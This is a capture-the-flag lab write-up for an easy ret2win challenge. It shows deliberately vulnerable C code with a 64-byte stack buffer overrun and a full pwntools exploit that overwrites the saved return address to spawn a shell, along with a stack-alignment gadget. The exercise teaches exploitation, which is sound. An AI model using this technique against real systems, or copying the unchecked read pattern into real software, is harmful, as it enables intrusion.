# Challenge 02: Returnal - ret2win

**Difficulty**: ★★☆☆☆ Easy  
**Binary**: `returnal`  
**Port**: 1338  
**Category**: Control Flow Hijacking / ret2win

## Description

The program has a `win()` function that spawns a shell, but it's never called. A `vulnerable()` function reads 256 bytes into a 64-byte buffer using `read()`. No PIE, no canary.

## Source Code Analysis

```c
void win(void)
{
    puts("You found the secret!");
    system("/bin/sh");
}

void vulnerable(void)
{
    char buffer[64];
    read(0, buffer, 256);  // Reads 256 bytes into 64-byte buffer
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

### Vulnerability

- `buffer` is 64 bytes
- `read(0, buffer, 256)` reads 256 bytes
- Overflow: 256 - 64 = 192 bytes of overflow
- Overwrites saved RBP (8 bytes) and saved RIP (8 bytes)

## Binary Protections

```bash
$ checksec --file=returnal
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

- **No stack canary**
- **No PIE** - `win()` address is static
- **NX enabled** - can't execute shellcode on stack

## Exploitation: ret2win

Overwrite saved RIP with address of `win()`. When `vulnerable()` returns, it jumps to `win()`.

### Step 1: Find `win()` Address

```bash
gdb ./returnal
(gdb) info functions win
(gdb) p win
# Example: 0x401156
```

Or:
```bash
nm ./returnal | grep win
objdump -d ./returnal | grep -A5 "<win>:"
```

### Step 2: Calculate Offset

Buffer (64) + Saved RBP (8) = **72 bytes** to reach RIP.

Verify with GDB:
```bash
gdb ./returnal
(gdb) pattern create 100
(gdb) run
# Paste pattern
(gdb) pattern offset $rsp
```

### Step 3: Craft Payload

```python
from pwn import *

p = process('./returnal')
# Or remote: p = remote('localhost', 1338)

win_addr = 0x401156  # Replace with actual address
offset = 72

payload = b'A' * offset
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

### Stack Alignment Note

On 64-bit glibc 2.27+, `system()` requires 16-byte stack alignment. If exploit crashes in `do_system`/`movaps`, add a `ret` gadget before `win()`:

```python
ret_gadget = 0x40101a  # Find with: ROPgadget --binary returnal | grep "^ 0x.*: ret$"
payload = b'A' * offset
payload += p64(ret_gadget)  # Align stack
payload += p64(win_addr)
```

## Flag

Exploiting successfully gives an interactive shell. Read the flag:

```bash
cat /home/ctf/flag.txt
# Or wherever flag.txt is in the container
```

## Key Concepts Learned

- Saved Return Address (RIP) control
- Control Flow Hijacking
- Little-endian encoding (`p64()`)
- Binary protections: PIE, Canary, NX
- Stack alignment for `system()` calls

## Progressive Hints

1. What does the `ret` instruction do? Where does it get the next address?
2. Use `info functions` in GDB to find `win()` address
3. Buffer is 64 bytes, saved RBP is 8 bytes. How many bytes to reach RIP?